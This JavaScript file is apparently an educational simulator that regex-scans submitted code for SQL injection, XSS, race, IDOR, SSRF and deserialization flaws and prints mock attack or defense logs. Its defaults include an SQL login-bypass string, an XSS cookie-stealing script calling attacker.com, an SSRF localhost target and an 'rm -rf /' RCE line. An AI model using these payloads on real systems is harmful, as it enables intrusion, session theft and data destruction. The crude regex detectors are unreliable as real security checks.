/**
 * Chaos Simulation Engine
 * Runs mock executions of preset vulnerability scenarios under varying environmental conditions.
 */

// Helper to get formatted timestamp
const getTimestamp = () => {
  const now = new Date();
  return now.toTimeString().split(' ')[0];
};

// Simulation of delay helper
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const runSimulation = async (scenario, codeText, config, onLog) => {
  const { networkLatency, databaseStatus, cpuLoad, rps = 10, memoryUsage = 25, memoryLeak = false } = config;
  const t = getTimestamp();

  onLog(`[${t}] [SYS] Starting simulation for: ${scenario.name}...`, 'sys');
  await delay(300);

  // Calculate Memory Leak accumulation (needed for early returns)
  let nextMemory = memoryUsage;
  const isSqliVulnerable = /db\.query\(\s*['"`]SELECT.*WHERE.*=\s*['"`]\s*\+\s*\w+/i.test(codeText) || 
                           /db\.query\(\s*`SELECT\s+.*WHERE\s+.*=\s*\$\{.*\}`\s*\)/i.test(codeText) || 
                           /SELECT.*FROM.*WHERE.*=\s*\$\{/i.test(codeText);

  const isXssVulnerable = /\.innerHTML\s*=/i.test(codeText) || 
                          /dangerouslySetInnerHTML/i.test(codeText) ||
                          /document\.write\s*\(/i.test(codeText);

  const isRaceVulnerable = /const balance = await getBalance/i.test(codeText) && 
                           !/await transaction/i.test(codeText) && 
                           !/SELECT.*FOR UPDATE/i.test(codeText);

  const isIdorVulnerable = !/AND\s+user_id\b/i.test(codeText);

  const isSsrfVulnerable = /axios\.get\(\s*imageUrl\s*\)/i.test(codeText) || /fetch\(\s*imageUrl\s*\)/i.test(codeText);

  const isDeserializationVulnerable = /serialize\.unserialize\s*\(/i.test(codeText);

  // Determine active category (preset or custom code keywords)
  const activeCategory = scenario.isCustom ? 
    (/select|query|where|db\.|sql/i.test(codeText) ? 'sqli' :
     /html|innerhtml|script|dangerouslyset|svg|onload|document\.write/i.test(codeText) ? 'xss' :
     /withdraw|balance|transaction|lock|race|concurrent/i.test(codeText) ? 'race' :
     /url|http|fetch|axios|request/i.test(codeText) ? 'ssrf' :
     /serialize|unserialize|cookie|eval/i.test(codeText) ? 'deserialization' : 'generic')
    : scenario.id;

  let isCurrentVulnerable = false;
  if (activeCategory === 'sqli') isCurrentVulnerable = isSqliVulnerable;
  else if (activeCategory === 'xss') isCurrentVulnerable = isXssVulnerable;
  else if (activeCategory === 'race') isCurrentVulnerable = isRaceVulnerable;
  else if (activeCategory === 'idor') isCurrentVulnerable = isIdorVulnerable;
  else if (activeCategory === 'ssrf') isCurrentVulnerable = isSsrfVulnerable;
  else if (activeCategory === 'deserialization') isCurrentVulnerable = isDeserializationVulnerable;

  if (memoryLeak) {
    if (isCurrentVulnerable) {
      nextMemory = Math.min(100, memoryUsage + 25);
    } else {
      nextMemory = Math.max(25, memoryUsage - 25);
    }
  }

  // 1. Check Out of Memory Crash
  if (memoryUsage >= 100) {
    onLog(`[${getTimestamp()}] [CRITICAL] [NODE] FATAL ERROR: JavaScript heap out of memory. Connection pool closed.`, 'err');
    onLog(`[${getTimestamp()}] [API] Response: 503 Service Unavailable (Server Crashed)`, 'err');
    return {
      success: false,
      status: 'crashed',
      result: 'FATAL: Server crashed due to Out of Memory (Heap Exhausted).',
      metrics: { timeSpent: 50, fallbackUsed: false, memoryUsage: 100 }
    };
  }

  // 2. Check Immediate Rate Limiting Exception (rps > 100)
  if (rps > 100) {
    onLog(`[${getTimestamp()}] [429] [RATE_LIMIT] Too Many Requests. API Gateway rate limit exceeded (${rps} RPS > 100 limit). Halting simulation.`, 'warn');
    return {
      success: false,
      status: 'rate_limited',
      result: '[429] Too Many Requests',
      metrics: { timeSpent: 10, fallbackUsed: false, memoryUsage: nextMemory }
    };
  }

  // 3. Check Session Expired / Token Expiration state
  if (config.sessionExpired || config.sessionTimeout) {
    onLog(`[${getTimestamp()}] [ERR] [401] Unauthorized. Session has expired or token is invalid.`, 'err');
    onLog(`[${getTimestamp()}] [CRITICAL] [NODE] Traceback (most recent call last):`, 'err');
    onLog(`[${getTimestamp()}] [CRITICAL] [NODE]   File "/app/middleware/auth.js", line 24, in verifyToken`, 'err');
    onLog(`[${getTimestamp()}] [CRITICAL] [NODE]     throw new TokenExpiredError("jwt expired", expiredAt);`, 'err');
    onLog(`[${getTimestamp()}] [CRITICAL] [NODE] TokenExpiredError: jwt expired`, 'err');
    onLog(`[${getTimestamp()}] [API] Response: 401 Unauthorized`, 'err');
    return {
      success: false,
      status: 'unauthorized',
      result: 'HTTP 401: Unauthorized. Token expiration state is active.',
      metrics: { timeSpent: 15, fallbackUsed: false, memoryUsage: nextMemory }
    };
  }

  if (memoryLeak) {
    if (isCurrentVulnerable) {
      onLog(`[${getTimestamp()}] [WARN] [NODE] Memory leak detected! RAM usage increased by 25% (Current Heap: ${nextMemory}%).`, 'warn');
    } else {
      onLog(`[${getTimestamp()}] [INFO] [NODE] Secure remediation active. Performing garbage collection. Heap cleaned (RAM: ${nextMemory}%).`, 'info');
    }
  }

  // 4. Rate Limiting Check (Standard)
  const hasRateLimiter = /rateLimit|express-rate-limit/i.test(codeText);
  if (rps > 100) {
    if (!hasRateLimiter) {
      onLog(`[${getTimestamp()}] [WARN] [API] Incoming request rate is extremely high (${rps} RPS). No rate limiting middleware detected in route handler.`, 'warn');
      if (rps > 150) {
        onLog(`[${getTimestamp()}] [ALARM] [DoS] API Gateway flooded! Returning HTTP 429 Too Many Requests.`, 'err');
        return {
          success: false,
          status: 'crashed',
          result: 'HTTP 429: Rate limit exceeded. Gateway flooded under DoS (Requests: ' + rps + ' RPS).',
          metrics: { timeSpent: 100, fallbackUsed: false, memoryUsage: nextMemory }
        };
      }
    } else {
      onLog(`[${getTimestamp()}] [INFO] [API] Incoming rate: ${rps} RPS. Rate limiting active. Requests throttled successfully.`, 'info');
    }
  }

  // Apply CPU load warning if load > 60%
  if (cpuLoad > 60) {
    const cpuDelay = Math.floor(cpuLoad * 12);
    onLog(`[${getTimestamp()}] [WARN] [CPU] System CPU utilization is high (${cpuLoad}%). Throttling process thread pool. Adding ${cpuDelay}ms execution overhead.`, 'warn');
    await delay(cpuDelay);
  }

  // Simulate network hops
  onLog(`[${getTimestamp()}] [SYS] Routing request through API Gateway...`, 'sys');
  
  if (networkLatency > 0) {
    onLog(`[${getTimestamp()}] [WARN] [NET] Simulating network latency. Delaying request by ${networkLatency}ms.`, 'warn');
    await delay(networkLatency);
  }

  // ERP and API Gateway log streams for custom files
  if (scenario.isCustom) {
    const traceId = 'TR-ERP-' + Math.floor(100000 + Math.random() * 900000);
    onLog(`[${getTimestamp()}] [ERP-GATEWAY] [TRACE-ID: ${traceId}] [INFO] Processing inbound XML transaction payload.`, 'info');
    await delay(100);
    onLog(`[${getTimestamp()}] [ERP-GATEWAY] [TRACE-ID: ${traceId}] [INFO] Routing transaction to main accounting node instance.`, 'info');
    await delay(150);
    onLog(`[${getTimestamp()}] [ACCOUNTING-NODE] [TRACE-ID: ${traceId}] [INFO] Checking parameters for security tokens and integrity limits...`, 'info');
    await delay(200);

    if (isCurrentVulnerable) {
      onLog(`[${getTimestamp()}] [ACCOUNTING-NODE] [TRACE-ID: ${traceId}] [ERR] SECURITY_ALERT: Validation check failed! Insecure direct variable ingestion detected.`, 'err');
      onLog(`[${getTimestamp()}] [ERP-GATEWAY] [TRACE-ID: ${traceId}] [ALARM] Transaction processing aborted: Vulnerability exploited in backend service.`, 'err');
      return {
        success: true,
        status: 'exploited',
        result: 'ERP/Accounting Transaction Failed: Object injection or direct parameter tampering detected.',
        metrics: { timeSpent: networkLatency + 600 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [ACCOUNTING-NODE] [TRACE-ID: ${traceId}] [INFO] Sanitisation and boundary validation checks: PASSED.`, 'info');
      onLog(`[${getTimestamp()}] [ERP-GATEWAY] [TRACE-ID: ${traceId}] [INFO] Routing successfully completed. Transaction status 200 OK returned.`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'ERP/Accounting Transaction Completed: Input sanitized, authorization validated.',
        metrics: { timeSpent: networkLatency + 500 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  onLog(`[${getTimestamp()}] [INFO] [API] Request received: POST /api/v1/${scenario.endpoint}`, 'info');

  // Database Access Simulation (if DB is needed)
  const needsDb = ['sqli', 'race', 'resilience', 'idor'].includes(activeCategory);
  if (needsDb) {
    onLog(`[${getTimestamp()}] [INFO] [DB] Connecting to PostgreSQL pool...`, 'info');
    await delay(100);

    if (databaseStatus === 'offline') {
      onLog(`[${getTimestamp()}] [ERR] [DB] Connection Refused: PostgreSQL server at 10.0.4.15:5432 did not respond.`, 'err');
      
      const isResilient = /try\s*\{/i.test(codeText) && 
                          /catch\s*\(.*\)/i.test(codeText) && 
                          !/catch\s*\(.*\)\s*\{\s*\}/i.test(codeText);

      if (isResilient) {
        onLog(`[${getTimestamp()}] [INFO] [SYS] Exception caught by application try-catch handler. Triggering fallback pathway.`, 'info');
        onLog(`[${getTimestamp()}] [WARN] [SYS] PostgreSQL offline. Serving stale cached content from Redis.`, 'warn');
        onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Served from Cache)`, 'info');
        return {
          success: true,
          status: 'warning',
          result: 'Served from Redis cache (Database offline, application recovered via fallback).',
          metrics: { timeSpent: networkLatency + 400 + (cpuLoad * 12), fallbackUsed: true, memoryUsage: nextMemory }
        };
      } else {
        onLog(`[${getTimestamp()}] [CRITICAL] [NODE] Unhandled Promise Rejection: DB_CONN_TIMEOUT at connection pool check. Process crashed.`, 'err');
        onLog(`[${getTimestamp()}] [API] Response: 500 Internal Server Error (Connection Timeout)`, 'err');
        return {
          success: false,
          status: 'crashed',
          result: 'CRITICAL ERROR: Connection Timeout. Server crashed due to missing resilience handlers (Unhandled Exception).',
          metrics: { timeSpent: networkLatency + 150 + (cpuLoad * 12), fallbackUsed: false, memoryUsage: nextMemory }
        };
      }
    }

    onLog(`[${getTimestamp()}] [INFO] [DB] Connection established. Executing transaction query...`, 'info');
    await delay(200);
  }

  // Scenario-specific execution logics
  if (activeCategory === 'sqli') {
    const payload = scenario.payload || "admin' OR '1'='1";
    onLog(`[${getTimestamp()}] [INFO] [DB] Query: SELECT * FROM users WHERE username = '${payload}' AND password = 'password'`, 'info');

    if (isSqliVulnerable) {
      onLog(`[${getTimestamp()}] [WARN] [DB] Security warning: Raw query execution without sanitization.`, 'warn');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] SQL Injection successful! Row returns 'admin' profile because 1=1 is always true.`, 'err');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Access Granted - Logged in as: admin)`, 'info');
      return {
        success: true,
        status: 'exploited',
        result: 'SQL Injection successful! User authenticated as admin without a valid password.',
        metrics: { timeSpent: networkLatency + 600 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [INFO] [DB] Parameterized query executed: SELECT * FROM users WHERE username = $1 AND password = $2`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [DB] Result: 0 rows matched (username evaluated strictly as literal string "admin' OR '1'='1").`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 401 Unauthorized (Invalid credentials)`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'Authentication failed. Parameterized query safely defended against SQL Injection injection.',
        metrics: { timeSpent: networkLatency + 600 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  if (activeCategory === 'xss') {
    const payload = scenario.payload || "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>";
    onLog(`[${getTimestamp()}] [INFO] [SYS] User submitted comment data: ${payload}`, 'info');

    if (isXssVulnerable) {
      onLog(`[${getTimestamp()}] [ALARM] [SEC] DOM-XSS Vulnerability triggered! Unsanitized input rendered using innerHTML.`, 'err');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Executed Script Payload: stealing cookies...`, 'err');
      onLog(`[${getTimestamp()}] [WARN] [NET] Payload transmitted sensitive header: Cookie: session_id=jwt_token_auth_9981`, 'warn');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Comment rendered with payload)`, 'info');
      return {
        success: true,
        status: 'exploited',
        result: 'XSS Attack successful! Cookie session stolen by embedded script.',
        metrics: { timeSpent: networkLatency + 400 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [INFO] [SYS] Sanitizing input with textContent / DOMPurify...`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [SYS] Rendered comment safely: HTML special characters escaped.`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Safe HTML render)`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'XSS prevented. Code sanitized input, rendering it safely as plaintext.',
        metrics: { timeSpent: networkLatency + 400 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  if (activeCategory === 'race') {
    onLog(`[${getTimestamp()}] [INFO] [SYS] Dispatching 2 concurrent withdraw actions of $100 (Balance: $150)...`, 'info');
    onLog(`[${getTimestamp()}] [INFO] [DB] Transaction A check: Balance is $150 >= $100. Approved.`, 'info');
    onLog(`[${getTimestamp()}] [INFO] [DB] Transaction B check: Balance is $150 >= $100. Approved.`, 'info');

    await delay(300);

    if (isRaceVulnerable) {
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Race condition exploited! Double spend successful. Both transactions debited without intermediate locking.`, 'err');
      onLog(`[${getTimestamp()}] [INFO] [DB] Final balance: -$50`, 'err');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Dispensed $200 total)`, 'info');
      return {
        success: true,
        status: 'exploited',
        result: 'Double Spend successful! Account overdrawn due to race condition (unlocked read-write cycle).',
        metrics: { timeSpent: networkLatency + 800 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [INFO] [DB] Transaction A locks row FOR UPDATE.`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [DB] Transaction A debits $100. Balance becomes $50. Releases lock.`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [DB] Transaction B acquires lock. Balance check: $50 < $100. Rejected.`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 400 Bad Request (Transaction B: Insufficient funds)`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'Race condition prevented. Transactions serialized correctly using rows locks.',
        metrics: { timeSpent: networkLatency + 800 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  if (activeCategory === 'idor') {
    const payload = scenario.payload || "orderId_9981";
    onLog(`[${getTimestamp()}] [INFO] [SYS] User requested lookup for order record ID: ${payload}`, 'info');

    if (isIdorVulnerable) {
      onLog(`[${getTimestamp()}] [WARN] [DB] Query: SELECT * FROM orders WHERE id = '${payload}'`, 'warn');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Broken Object Level Authorization (BOLA/IDOR) exploited! Unauthorized data access.`, 'err');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Order details exposed: { id: '${payload}', user_id: 'user_B_9921', total: $5,240.00, items: ['Server Hardware Cluster'] }`, 'err');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Data leakage active)`, 'info');
      return {
        success: true,
        status: 'exploited',
        result: 'IDOR exploited! Private order data belonging to User B was retrieved by User A.',
        metrics: { timeSpent: networkLatency + 350 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [INFO] [DB] Executing parameterized ownership query: SELECT * FROM orders WHERE id = $1 AND user_id = $2`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [DB] Result: 0 rows returned (User A is not the owner of order ${payload}).`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 404 Not Found (Unauthorized)`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'Access denied. The secure query verifies object ownership against session context.',
        metrics: { timeSpent: networkLatency + 350 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  if (activeCategory === 'ssrf') {
    const payload = scenario.payload || "http://localhost:8080/admin";
    onLog(`[${getTimestamp()}] [INFO] [SYS] Dispatching request to proxy fetch URL: ${payload}`, 'info');

    if (isSsrfVulnerable) {
      onLog(`[${getTimestamp()}] [WARN] [SYS] Resolving outbound query for: ${payload} on internal loopback...`, 'warn');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] SSRF successful! Server made connection to internal-only management dashboard at 127.0.0.1:8080.`, 'err');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Exfiltrated internal data: { status: 'online', credentials: 'admin:super_secret_master_password' }`, 'err');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Proxy data delivered)`, 'info');
      return {
        success: true,
        status: 'exploited',
        result: 'SSRF exploited! The server connected to the local port 8080 and returned internal admin data.',
        metrics: { timeSpent: networkLatency + 500 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [INFO] [SYS] Parsing URL: hostname resolved to localhost / loopback range.`, 'info');
      onLog(`[${getTimestamp()}] [WARN] [SYS] Request blocked: domain 'localhost' is not in the whitelist of approved image hosts.`, 'warn');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 400 Bad Request (Blocked Domain)`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'SSRF blocked. Outbound URLs are strictly whitelisted and loopback/private ranges are rejected.',
        metrics: { timeSpent: networkLatency + 200 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  if (activeCategory === 'deserialization') {
    const payload = scenario.payload || '{"username":"admin"}';
    onLog(`[${getTimestamp()}] [INFO] [SYS] Parsing incoming session cookie: ${payload}`, 'info');

    if (isDeserializationVulnerable) {
      onLog(`[${getTimestamp()}] [WARN] [SYS] Running serialize.unserialize() on untrusted cookie input...`, 'warn');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Insecure Deserialization successful! Object Injection callback executed automatically.`, 'err');
      onLog(`[${getTimestamp()}] [ALARM] [SEC] Executing injected payload: child_process.exec("rm -rf /") on host server...`, 'err');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (RCE exploit completed)`, 'info');
      return {
        success: true,
        status: 'exploited',
        result: 'Insecure Deserialization exploited! Remote Code Execution (RCE) achieved on the server.',
        metrics: { timeSpent: networkLatency + 450 + (cpuLoad * 12), vulnFound: true, memoryUsage: nextMemory }
      };
    } else {
      onLog(`[${getTimestamp()}] [INFO] [SYS] Invoking safe JSON parser: JSON.parse(cookie)`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [SYS] Session object loaded: { username: "admin" }`, 'info');
      onLog(`[${getTimestamp()}] [INFO] [API] Response: 200 OK (Welcome admin)`, 'info');
      return {
        success: true,
        status: 'secure',
        result: 'Cookie parsed safely using JSON.parse(). Code execution strings are ignored.',
        metrics: { timeSpent: networkLatency + 150 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
      };
    }
  }

  // Fallback for general custom codes
  onLog(`[${getTimestamp()}] [INFO] [SYS] Script completed successfully without critical errors.`, 'info');
  return {
    success: true,
    status: 'secure',
    result: 'Execution successful. Environment resources held within normal operating thresholds.',
    metrics: { timeSpent: networkLatency + 300 + (cpuLoad * 12), vulnFound: false, memoryUsage: nextMemory }
  };
};
